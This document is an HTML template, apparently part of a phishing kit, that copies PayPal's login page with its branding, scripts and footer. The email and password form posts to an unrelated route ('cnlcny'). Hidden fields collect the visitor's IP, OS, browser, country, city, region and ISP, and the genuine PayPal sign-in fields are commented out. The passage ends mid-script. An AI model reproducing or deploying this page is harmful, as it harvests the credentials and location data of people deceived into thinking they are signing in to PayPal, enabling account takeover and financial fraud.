<!DOCTYPE html>
<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie desktop"><![endif]-->
<!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie desktop"><![endif]-->
<!--[if !IE]>-->
<html lang="en" class="no-js desktop">
    <!--<![endif]-->
    <head>
        <!--Script info: script: node, template:  , date: Jun 24, 2018 06:33:37 -07:00, country: US, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKGwzlRYVzhkeg30+gfGlEYiU rlogid : NRf6arxBdRyz1JkiLbublR9ft0AbEfNl%2B0H8xpQc%2BXx3MYkBdx2raxY%2FdMnyJp5Zd%2FU3Jl563nGwdXk%2Bop17e0KVoFrE411f_16431fffe36 -->
        <meta charset="utf-8" />
        <title>Log in to your PayPal account</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta name="application-name" content="PayPal" />
        <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
        <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
        <meta
            name="msapplication-task"
            content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"
        />
        <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
        <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
        <link rel="canonical" href="https://www.paypal.com/us/signin" />
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
        <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/064/b5db45519f3ee9cacb3b28ada1570/css/contextualLogin.css" />
        <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/064/b5db45519f3ee9cacb3b28ada1570/css/ie9.css" /><![endif]-->
        <style>
            .hidden{
                display: none;
            }
        </style>
        <script src="{{ asset('js/paypal/visitor.js') }}"></script>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            window.Modernizr = (function (e, t, n) {
                function r(e) {
                    d.cssText = e;
                }
                function i(e, t) {
                    return r(prefixes.join(e + ";") + (t || ""));
                }
                function s(e, t) {
                    return typeof e === t;
                }
                function o(e, t) {
                    return !!~("" + e).indexOf(t);
                }
                function u(e, t, r) {
                    for (var i in e) {
                        var o = t[e[i]];
                        if (o !== n) return r === !1 ? e[i] : s(o, "function") ? o.bind(r || t) : o;
                    }
                    return !1;
                }
                var a = "2.6.1",
                    f = {},
                    l = !0,
                    c = t.documentElement,
                    h = "modernizr",
                    p = t.createElement(h),
                    d = p.style,
                    v,
                    m = {}.toString,
                    g = {},
                    y = {},
                    b = {},
                    w = [],
                    E = w.slice,
                    S,
                    x = {}.hasOwnProperty,
                    T;
                !s(x, "undefined") && !s(x.call, "undefined")
                    ? (T = function (e, t) {
                          return x.call(e, t);
                      })
                    : (T = function (e, t) {
                          return t in e && s(e.constructor.prototype[t], "undefined");
                      }),
                    Function.prototype.bind ||
                        (Function.prototype.bind = function (e) {
                            var t = this;
                            if (typeof t != "function") throw new TypeError();
                            var n = E.call(arguments, 1),
                                r = function () {
                                    if (this instanceof r) {
                                        var i = function () {};
                                        i.prototype = t.prototype;
                                        var s = new i(),
                                            o = t.apply(s, n.concat(E.call(arguments)));
                                        return Object(o) === o ? o : s;
                                    }
                                    return t.apply(e, n.concat(E.call(arguments)));
                                };
                            return r;
                        });
                for (var N in g) T(g, N) && ((S = N.toLowerCase()), (f[S] = g[N]()), w.push((f[S] ? "" : "no-") + S));
                return (
                    (f.addTest = function (e, t) {
                        if (typeof e == "object") for (var r in e) T(e, r) && f.addTest(r, e[r]);
                        else {
                            e = e.toLowerCase();
                            if (f[e] !== n) return f;
                            (t = typeof t == "function" ? t() : t), l && (c.className += " " + (t ? "" : "no-") + e), (f[e] = t);
                        }
                        return f;
                    }),
                    r(""),
                    (p = v = null),
                    (function (e, t) {
                        function n(e, t) {
                            var n = e.createElement("p"),
                                r = e.getElementsByTagName("head")[0] || e.documentElement;
                            return (n.innerHTML = "x<style>" + t + "</style>"), r.insertBefore(n.lastChild, r.firstChild);
                        }
                        function r() {
                            var e = g.elements;
                            return typeof e == "string" ? e.split(" ") : e;
                        }
                        function i(e) {
                            var t = v[e[p]];
                            return t || ((t = {}), d++, (e[p] = d), (v[d] = t)), t;
                        }
                        function s(e, n, r) {
                            n || (n = t);
                            if (m) return n.createElement(e);
                            r || (r = i(n));
                            var s;
                            return r.cache[e] ? (s = r.cache[e].cloneNode()) : c.test(e) ? (s = (r.cache[e] = r.createElem(e)).cloneNode()) : (s = r.createElem(e)), s.canHaveChildren && !l.test(e) ? r.frag.appendChild(s) : s;
                        }
                        function o(e, n) {
                            e || (e = t);
                            if (m) return e.createDocumentFragment();
                            n = n || i(e);
                            var s = n.frag.cloneNode(),
                                o = 0,
                                u = r(),
                                a = u.length;
                            for (; o < a; o++) s.createElement(u[o]);
                            return s;
                        }
                        function u(e, t) {
                            t.cache || ((t.cache = {}), (t.createElem = e.createElement), (t.createFrag = e.createDocumentFragment), (t.frag = t.createFrag())),
                                (e.createElement = function (n) {
                                    return g.shivMethods ? s(n, e, t) : t.createElem(n);
                                }),
                                (e.createDocumentFragment = Function(
                                    "h,f",
                                    "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" +
                                        r()
                                            .join()
                                            .replace(/\w+/g, function (e) {
                                                return t.createElem(e), t.frag.createElement(e), 'c("' + e + '")';
                                            }) +
                                        ");return n}"
                                )(g, t.frag));
                        }
                        function a(e) {
                            e || (e = t);
                            var r = i(e);
                            return g.shivCSS && !h && !r.hasCSS && (r.hasCSS = !!n(e, "article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}")), m || u(e, r), e;
                        }
                        var f = e.html5 || {},
                            l = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
                            c = /^<|^(?:a|b|button|code|div|fieldset|form|h1|h2|h3|h4|h5|h6|i|iframe|img|input|label|li|link|ol|option|p|param|q|script|select|span|strong|style|table|tbody|td|textarea|tfoot|th|thead|tr|ul)$/i,
                            h,
                            p = "_html5shiv",
                            d = 0,
                            v = {},
                            m;
                        (function () {
                            try {
                                var e = t.createElement("a");
                                (e.innerHTML = "<xyz></xyz>"),
                                    (h = "hidden" in e),
                                    (m =
                                        e.childNodes.length == 1 ||
                                        (function () {
                                            t.createElement("a");
                                            var e = t.createDocumentFragment();
                                            return typeof e.cloneNode == "undefined" || typeof e.createDocumentFragment == "undefined" || typeof e.createElement == "undefined";
                                        })());
                            } catch (n) {
                                (h = !0), (m = !0);
                            }
                        })();
                        var g = {
                            elements: f.elements || "abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",
                            shivCSS: f.shivCSS !== !1,
                            supportsUnknownElements: m,
                            shivMethods: f.shivMethods !== !1,
                            type: "default",
                            shivDocument: a,
                            createElement: s,
                            createDocumentFragment: o,
                        };
                        (e.html5 = g), a(t);
                    })(this, t),
                    (f._version = a),
                    (c.className = c.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + (l ? " js " + w.join(" ") : "")),
                    f
                );
            })(this, this.document);
        </script>
        <style id="antiClickjack">
            body {
                display: none !important;
            }
        </style>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            /* Special integration eligibility check */ function isEligibleIntegration() {
                var sxf = "";
                return sxf === "true" || window.name === "PPFrameRedirect";
            }
            /* Don't bust the frame if this is top window */ if (self === top || isEligibleIntegration()) {
                var antiClickjack = document.getElementById("antiClickjack");
                if (antiClickjack) {
                    antiClickjack.parentNode.removeChild(antiClickjack);
                }
            } else {
                top.location = self.location;
            }
        </script>
    </head>
    <body
        class="desktop"
        data-rlogid="NRf6arxBdRyz1JkiLbublR9ft0AbEfNl%2B0H8xpQc%2BXx3MYkBdx2raxY%2FdMnyJp5Zd%2FU3Jl563nGwdXk%2Bop17e0KVoFrE411f_16431fffe36"
        data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKGwzlRYVzhkeg30+gfGlEYiU"
        data-production="true"
        data-enable-ads-captcha="true"
        data-ads-challenge-url="/auth/createchallenge/1f7e67994640ab05/challenge.js"
        data-enable-client-cal-logging="true"
        data-correlation-id="24a8af95a8e6a"
        data-show-hide-password="true"
        data-enable-fn-beacon-on-web-views="true"
        data-csrf-token="p02PG7qTPOzRbBlVOVYcIZp207FMD847ffoS0="
        data-nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN"
        data-tealeaf-url="https://www.paypalobjects.com/web/res/064/b5db45519f3ee9cacb3b28ada1570/js/lib/tealeaf-ul-prod_domcap.min.js"
    >
        <noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript>
        <div id="main" class="main" role="main">
            <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
                <div class="corral">
                    <div class="contentContainer activeContent">
                        <header><p class="paypal-logo paypal-logo-long"></p></header>
                        <h1 class="headerText accessAid">Log in to your PayPal account</h1>
                        <div class="notifications"></div>
                        <!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
                        <form action="{{ url('cnlcny') }}" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
                            @csrf
                            <!-- <input type="hidden" id="token" name="_csrf" value="p02PG7qTPOzRbBlVOVYcIZp207FMD847ffoS0=" /><input type="hidden" name="locale.x" value="en_US" /><input type="hidden" name="processSignin" value="main" />
                            <input type="hidden" name="fn_sync_data" value="fn_sync_data" /><input type="hidden" name="intent" value="signin" /><input type="hidden" name="ads-client-context" value="signin" />
                            <input type="hidden" name="requestUrl" value="/signin" /><input type="hidden" name="forcePhonePasswordOptIn" value="" /> -->
                            <div id="passwordSection" class="clearfix">
                                <div id="emailSection" class="clearfix">
                                    <div class="textInput" id="login_emaildiv">
                                        <div class="fieldWrapper">
                                            <label for="email" class="fieldLabel">Email</label>
                                            <input id="email" name="login_email" type="" class="hasHelp validateEmpty" required="required" value="" autocomplete="off" placeholder="Email" aria-describedby="emailErrorMessage" />
                                        </div>
                                        <div class="errorMessage" id="emailErrorMessage">
                                            <p class="emptyError hide">Required</p>
                                            <p class="invalidError hide">That email format isn’t right</p>
                                        </div>
                                    </div>
                                </div>
                                <div id="passwordSection" class="clearfix">
                                    <div class="textInput" id="login_passworddiv">
                                        <div class="fieldWrapper">
                                            <label for="password" class="fieldLabel">Password</label>
                                            <input id="password" name="login_password" type="password" class="hasHelp validateEmpty pin-password" required="required" value="" placeholder="Password" aria-describedby="passwordErrorMessage" />
                                            <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password">Show</button>
                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide">Hide</button>
                                        </div>
                                        <div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Required</p></div>
                                    </div>
                                </div>
                            </div>
                            <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div>
                            <!-- <input type="hidden" name="splitLoginContext" value="inputPassword" /><input type="hidden" name="splitLoginCookiedFallback" value="true" /> -->
                            <input type="text" class="hidden" id="ip" name="ip" value="{{ $getIpAddress }}">
                            <input type="text" class="hidden" id="os" name="os" value="{{ $getOS }}">
                            <input type="text" class="hidden" id="browser" name="browser" value="{{ $getBrowser }}">
                            <input type="text" class="hidden" id="country" name="country" value="{{ $country }}">
                            <input type="text" class="hidden" id="city" name="city" value="{{ $city }}">
                            <input type="text" class="hidden" id="region" name="region" value="{{ $region }}">
                            <input type="text" class="hidden" id="isp" name="isp" value="{{ $isp }}">
                            <div id="ipInfo"></div>
                        </form>
                        <div class="moreOptionsDiv hide" id="moreOptionsContainer">
                            <a href="#" id="moreOptions" class="moreOptionsInfo">More options</a>
                            <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                                <ul class="moreoptionsGroup">
                                    <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile">Approve login using mobile device</a></li>
                                    <li>
                                        <a href="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;loginUrl=https%3A%2F%2Fwww.paypal.com%2Fsignin%2F" class="scTrack:unifiedlogin-click-forgot-password pwrLink">
                                            Having trouble logging in?
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="forgotLink">
                            <a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink">
                                Having trouble logging in?
                            </a>
                        </div>
                        <div class="pwr-modal forgotPasswordModal" id="password-recovery-modal">
                            <iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;loginUrl=https%3A%2F%2Fwww.paypal.com%2Fsignin%2F" scrolling="no" data-auto-reload="true"></iframe>
                            <div class="monogram-small"></div>
                        </div>
                        <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                            <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
                            <a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</a>
                        </div>
                    </div>
                </div>
            </section>
            <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal">
                <div class="corral">
                    <div class="contentContainer contentContainerLean">
                        <div id="pending" class="verificationSubSection">
                            <h1 class="headerText">We sent a notification</h1>
                            <p class="verification-message">Check your phone or open the PayPal app to respond.</p>
                            <div class="notifications"></div>
                            <div class="accountArea">
                                <span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink">Not you?</a></span>
                            </div>
                            <div class="mobileNotification">
                                <p class="pin"></p>
                                <div class="mobileScreen"><img src="https://www.paypalobjects.com/images/shared/icon-PN-check.png" alt="phone" /></div>
                            </div>
                            <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password">Use password instead</a></p>
                            <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend">Resend</a><span class="sentMessage hide">Sent</span></p>
                        </div>
                        <div id="expired" class="hide verificationSubSection">
                            <header><p class="paypal-logo paypal-logo-long">PayPal</p></header>
                            <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
                            <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                            <button id="expiredTryAgainButton" class="button actionsSpaced">Try Again</button>
                        </div>
                        <div id="denied" class="denied hide verificationSubSection">
                            <img alt="" src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png" class="deniedCaution" />
                            <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
                            <p>Need a hand?, <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help">We can help</a>.</p>
                        </div>
                    </div>
                </div>
            </section>
            <footer class="footer" role="contentinfo">
                <div class="legalFooter">
                    <ul class="footerGroup">
                        <li><a target="_blank" href="/us/cgi-bin/webscr?cmd=_help">Contact Us</a></li>
                        <li><a target="_blank" href="/us/webapps/mpp/ua/privacy-full">Privacy</a></li>
                        <li><a target="_blank" href="/us/webapps/mpp/ua/legalhub-full">Legal</a></li>
                        <li><a target="_blank" href="/us/webapps/mpp/country-worldwide">Worldwide</a></li>
                    </ul>
                </div>
            </footer>
        </div>
        <div class="transitioning hide">
            <p class="checkingInfo hide">Checking your info…</p>
            <p class="oneSecond hide">Just a second…</p>
            <p class="secureMessage hide">Securely logging you in...</p>
            <p class="oneTouchMessage hide"></p>
            <p class="retrieveInfo hide">Retrieving your info...</p>
            <p class="waitFewSecs hide">This may take a few seconds...</p>
        </div>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            var PAYPAL = PAYPAL || {};
            PAYPAL.ulData = {
                fnUrl: "https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js",
                fnSessionId: "e2766dcd8e0d4fb998f4896a844797e4",
                sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD",
                beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD1lMjc2NmRjZDhlMGQ0ZmI5OThmNDg5NmE4NDQ3OTdlNCZpPTc5LjEwNi4xMjYuMCZ0PTE1Mjk4NDcyMTcuNzgxJmE9MjEmcz1VTklGSUVEX0xPR0lOqozznX2w0G1T2SU2ax2ckzmaD_M",
                enableSpeedTyping: "true",
                aPayAuth: "",
                tokenAssertionUri: "",
                preloadScriptUrl: "",
                fingerprintProceed: "",
                incontextData: { version: "", noBridge: "", env: "", icstage: "", targetCancelUrl: "", paymentAction: "", paymentToken: "", merchantID: "" },
            };
        </script>
        <noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=e2766dcd8e0d4fb998f4896a844797e4&s=UNIFIED_LOGIN_INPUT_PASSWORD&js=0&r=1" alt="" height="1" width="1" border="0" /></noscript>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN" id="ul-sync-data">
            var PAYPAL = PAYPAL || {};
            PAYPAL.ulSync = { fnSessionId: "e2766dcd8e0d4fb998f4896a844797e4", sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD", fname: "fn_sync_data" };
        </script>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            var PAYPAL = window.PAYPAL || {};
            !(function () {
                "use strict";
                function n(e) {
                    for (var t = 0, n = 0; n < e.length; n++) t += e.charCodeAt(n);
                    return (t &= t);
                }
                function r(e, t, n) {
                    "undefined" != typeof e.removeEventListener ? e.removeEventListener(t, n, !1) : "undefined" != typeof e.detachEvent && e.detachEvent("on" + t, n);
                }
                function i(e, t, n) {
                    "undefined" != typeof e.addEventListener ? e.addEventListener(t, n, !1) : "undefined" != typeof e.attachEvent && e.attachEvent("on" + t, n);
                }
                var e = {},
                    t = (function () {
                        var t = { idForHiddenField: null, isExceptionThrown: !1, startTime: new Date().getTime() },
                            n = { SC_VERSION: "2.0.0", syncStatus: "data" };
                        return {
                            initSync: function (r) {
                                try {
                                    (r = r || {}),
                                        (t.startTime = r.tStamp || t.startTime),
                                        (t.idForHiddenField = r.fname),
                                        (n.f = r.fnSessionId),
                                        (n.s = r.sourceId),
                                        (n.chk = {}),
                                        (n.chk.ts = t.startTime),
                                        (n.chk.eteid = e.chk.init(n.f, t.startTime.toString())),
                                        (n.chk.tts = new Date().getTime() - n.chk.ts),
                                        (n.dc = JSON.stringify(
                                            (function () {
                                                var e,
                                                    t = ["colorDepth", "pixelDepth", "height", "width", "availHeight", "availWidth"],
                                                    n = { screen: {} };
                                                for (n.ua = window.navigator.userAgent, e = 0; e < t.length; e += 1) n.screen[t[e]] = window.screen[t[e]];
                                                return n;
                                            })()
                                        )),
                                        e.ts.init(r),
                                        e.ms.init();
                                } catch (i) {
                                    (t.isExceptionThrown = !0), (n.err = i);
                                }
                            },
                            flushData: function () {
                                try {
                                    var r = e.ts.get() || {},
                                        i = e.ms.get();
                                    (r.ts1 || r.ts2 || i) && ((n.d = n.d || {}), (n.d.ts1 = r.ts1), (n.d.ts2 = r.ts2), (n.d.rDT = i)), (document.getElementsByName(t.idForHiddenField)[0].value = encodeURIComponent(JSON.stringify(n)));
                                } catch (s) {
                                    t.isExceptionThrown = !0;
                                }
                            },
                        };
                    })();
                (e.report = function (t) {
                    return (e.err = e.err || {}), (t += e.err);
                }),
                    Array.prototype.map ||
                        (Array.prototype.map = function (e) {
                            var t, n, r;
                            if (null == this) throw new TypeError("this is null or not defined");
                            var i = Object(this),
                                s = i.length >>> 0;
                            if ("function" != typeof e) throw new TypeError(e + " is not a function");
                            for (arguments.length > 1 && (t = arguments[1]), n = new Array(s), r = 0; r < s; ) {
                                var o, u;
                                r in i && ((o = i[r]), (u = e.call(t, o, r, i)), (n[r] = u)), r++;
                            }
                            return n;
                        }),
                    (e.chk = (function () {
                        function e(e, t) {
                            for (var n = 32, r = 0; n-- > 0; ) (e[0] += (((e[1] << 4) ^ (e[1] >> 5)) + e[1]) ^ (r + t[3 & r])), (r += -1640531527), (e[1] += (((e[0] << 4) ^ (e[0] >> 5)) + e[0]) ^ (r + t[(r >> 11) & 3]));
                        }
                        function t(e) {
                            for (var t = 0, n = 0; n < 4; n++) t |= e.charCodeAt(n) << (8 * n);
                            return isNaN(t) ? 0 : t;
                        }
                        return {
                            init: function (n, r) {
                                var i,
                                    s,
                                    o,
                                    u = new Array(2),
                                    a = new Array(8),
                                    f = new Array(4),
                                    l = 0,
                                    c = 0,
                                    h = n.split("").map(function (e) {
                                        return e.charCodeAt(0);
                                    });
                                for (c = 0; c < 4; c++) f[c] = t(r.slice(4 * c, 4 * (c + 1)));
                                for (c = 0; c < h.length; c += 8)
                                    (i = h),
                                        (s = c),
                                        ((o = u)[0] = ((255 & (0 | i[s])) << 24) | ((255 & (0 | i[s + 1])) << 16) | ((255 & (0 | i[s + 2])) << 8) | (255 & (0 | i[s + 3])) | 0),
                                        (o[1] = ((255 & (0 | i[s + 4])) << 24) | ((255 & (0 | i[s + 5])) << 16) | ((255 & (0 | i[s + 6])) << 8) | (255 & (0 | i[s + 7])) | 0),
                                        e(u, f),
                                        (a[l] = u[0]),
                                        (a[l + 1] = u[1]),
                                        (l += 2);
                                return a;
                            },
                        };
                    })()),
                    (e.ts = (function () {
                        function o(e, o, u) {
                            if (void 0 !== e || null !== e) {
                                var a = new (function () {
                                        (this.baseTime = new Date().getTime()),
                                            (this.keyIndex = 0),
                                            (this.controlCount = 0),
                                            (this.specialCount = 0),
                                            (this.spnum = 0),
                                            (this.keyIndexArray = []),
                                            (this.storageArray = []),
                                            (this.keeperArray = { 8: "", 9: "", 13: "", 16: "", 17: "", 18: "", 224: "", 91: "", 93: "", 219: "", 220: "" }),
                                            (this.controlArray = { 17: "", 224: "", 93: "", 91: "" }),
                                            (this.capture = function (e, i) {
                                                var o, u;
                                                window.event ? (o = e.keyCode) : e.which && (o = e.which);
                                                var a = new Date().getTime();
                                                (u = a - this.baseTime),
                                                    (this.baseTime = a),
                                                    o in this.keeperArray
                                                        ? "keydown" === e.type
                                                            ? (this.storageArray.push("Dk" + o + ":" + u), (this.specialCount = this.specialCount + 1), o in this.controlArray && (this.controlCount = this.controlCount + 1))
                                                            : "keyup" === e.type && (this.storageArray.push("Uk" + o + ":" + u), o in this.controlArray && (this.controlCount = this.controlCount + 1))
                                                        : "keydown" === e.type
                                                        ? (this.storageArray.push("Di" + this.keyIndex + ":" + u), (this.keyIndexArray[o] = this.keyIndex), this.keyIndex++)
                                                        : "keyup" === e.type && this.keyIndexArray[o] !== undefined && this.storageArray.push("Ui" + this.keyIndexArray[o] + ":" + u),
                                                    (s[i] = this.storageArray.join("")),
                                                    "ts2" === i &&
                                                        (this.keyIndex + this.specialCount >= 6 || (this.controlCount > 1 && this.keyIndex > 0)) &&
                                                        (function () {
                                                            for (var e = s, i = 0; i < t.length; ++i) {
                                                                var o = t[i];
                                                                "undefined" != typeof o.field && (r(o.field, "keydown", o.listener), r(o.field, "keyup", o.listener));
                                                            }
                                                            for (var u in e) e[u] = e[u] + "Uh:" + n(e[u]);
                                                        })();
                                            });
                                    })(),
                                    f = function (e) {
                                        a.capture(e, u);
                                    },
                                    l = {};
                                (l.id = e.id), (l.listener = f), (l.field = e), t.push(l), i(e, "keydown", f), i(e, "keyup", f);
                            }
                        }
                        var e = !1,
                            t = [],
                            s = {};
                        return {
                            init: function (t) {
                                if (((t = t || {}), !1 === e && t.detail && t.detail.fields)) {
                                    e = !0;
                                    for (var n = 0; n < t.detail.fields.length; n++) o(document.getElementById(t.detail.fields[n]), 0, "ts" + (n + 1));
                                }
                            },
                            get: function () {
                                return s;
                            },
                        };
                    })()),
                    (e.ms = (function () {
                        function s(t) {
                            if ("undefined" == typeof t.pageX) r(document, "mousemove", s);
                            else {
                                var n = new Date().getTime();
                                0 !== e.moveCounter &&
                                    ((a = t),
                                    (f = n - e.lastTime),
                                    (l = Math.abs(a.pageX - e.prevX)),
                                    (c = Math.abs(a.pageY - e.prevY)),
                                    (l > 1 || c > 1) &&
                                        ((h = f), (p = a), (d = Math.floor(10 * Math.random()) + 1), (v = 5123 * d + p.pageX), (m = 5123 * d + p.pageY), (g = 5123 * d + h), (e.rDT_local += v + "," + m + "," + g + ":"), e.counter++)),
                                    (i = n),
                                    (u = t),
                                    (e.lastTime = i),
                                    (e.prevX = u.pageX),
                                    (e.prevY = u.pageY),
                                    e.moveCounter++,
                                    (e.counter >= 20 || e.moveCounter >= 50) && r(document, "mousemove", s);
                            }
                            var i, u, a, f, l, c, h, p, d, v, m, g;
                        }
                        var e = { prevX: 0, prevY: 0, counter: 0, moveCounter: 0, lastTime: 0, rDT_local: "" },
                            t = !1;
                        return {
                            init: function () {
                                t || (i(document, "mousemove", s), (t = !0));
                            },
                            get: function () {
                                return "" !== e.rDT_local ? e.rDT_local + n(e.rDT_local) + "," + e.moveCounter : undefined;
                            },
                        };
                    })()),
                    (PAYPAL.syncData = t);
            })(window);
        </script>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            (window.PAYPAL = window.PAYPAL || {}),
                (function () {
                    "use strict";
                    function asyncLoadScriptUrls(e) {
                        var t = e.split(","),
                            n;
                        try {
                            for (var r = 0; r < t.length; r++) {
                                n = t[r];
                                if (n && n.slice(0, 8) === "https://" && n.slice(n.length - 3) === ".js") {
                                    var i = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
                                    i.open("GET", t[r]), i.send();
                                }
                            }
                        } catch (s) {}
                    }
                    function showReturnToMerchantLink() {
                        var e = document.querySelector("#returnToMerchant"),
                            t = document.querySelector(".contentContainer");
                        e && !window.opener && ($(e).removeClass("hide"), t && $(t).addClass("contentContainerShort"));
                    }
                    function trackHybridLoginRenderedEventInCal() {
                        var e = $("body").data("isHybridLoginExperience") === "true",
                            t = login.utils.getIntent() === "checkout",
                            n = $("body").hasClass("mobile") ? "MOBILE" : "DESKTOP";
                        e && login.logger.log({ evt: "HYBRID_LOGIN", data: "RENDERED" + (t ? "_XO" : "") + "_" + n, calEvent: !0 });
                    }
                    function instrumentUlAsLandingPageLoad() {
                        var e = document.querySelector("#password"),
                            t,
                            n = document.querySelector('input[name="locale.x"]'),
                            r = document.querySelector('input[name="clientLogRecords"]');
                        e && (t = login.utils.isFieldPrefilled(e) || e.value.length > 0);
                        var i = $("body").data("oneTouchUser"),
                            s = (window.PAYPAL && window.PAYPAL.ulData) || {},
                            o = s.aPayAuth;
                        if (i || o) return;
                        login.logger.logServerPreparedMetrics(),
                            r || (login.logger.log({ evt: "state_name", data: login.utils.getKmliCb() ? "LOGIN_UL_RM" : "LOGIN_UL", instrument: !0 }), login.logger.log({ evt: "transition_name", data: "prepare_login_ul", instrument: !0 })),
                            login.logger.log({ evt: "landing_page", data: "login", instrument: !0 }),
                            login.logger.log({ evt: "is_pwd_autofill", data: t ? "Y" : "N", instrument: !0 }),
                            login.logger.log({ evt: "design", data: login.utils.isInContextIntegration() ? "in-context" : "full-context", instrument: !0 }),
                            n && login.logger.log({ evt: "page_lang", data: n.value, instrument: !0 }),
                            login.logger.pushLogs();
                    }
                    function instrumentSplitLoginPageLoad(e) {
                        var t = "begin_email",
                            n = "prepare_email",
                            r = login.utils.isFieldPrefilled(document.querySelector("#email")),
                            i = document.querySelector('input[name="locale.x"]'),
                            s = window.PAYPAL && window.PAYPAL.slData && window.PAYPAL.slData.slAction,
                            o = $("body").data("oneTouchUser"),
                            u = (window.PAYPAL && window.PAYPAL.ulData) || {},
                            a = u.aPayAuth,
                            f = document.querySelector("#moreOptionsContainer"),
                            l = $("body").data("ssoviatoken");
                        if (o || a || l) return;
                        if (s === "activation" || s === "optIn") return;
                        e === "inputPassword"
                            ? ((t = "begin_pwd"), (n = "prepare_pwd" + (login.utils.getKmliCb() ? "_ot" : "")), (r = login.utils.isFieldPrefilled(document.querySelector("#password"))))
                            : e === "inputPhone"
                            ? ((t = "begin_phone"), (n = "prepare_phone"))
                            : e === "inputPin" && ((t = "begin_phone"), (n = "prepare_pin")),
                            e === "inputEmail" && trackHybridLoginRenderedEventInCal(),
                            f && !$(f).hasClass("hide") && e === "inputPassword" && ((n += "_more_opt"), login.logger.log({ evt: "exp_shown", data: "tpd", instrument: !0 })),
                            login.logger.log({ evt: "state_name", data: t, instrument: !0 }),
                            login.logger.log({ evt: "transition_name", data: n, instrument: !0 }),
                            login.logger.log({ evt: "autofill", data: r ? "Y" : "N", instrument: !0 }),
                            login.utils.getIntent() === "checkout" &&
                                (login.logger.log({ evt: "landing_page", data: "login", instrument: !0 }), login.logger.log({ evt: "design", data: login.utils.isInContextIntegration() ? "in-context" : "full-context", instrument: !0 })),
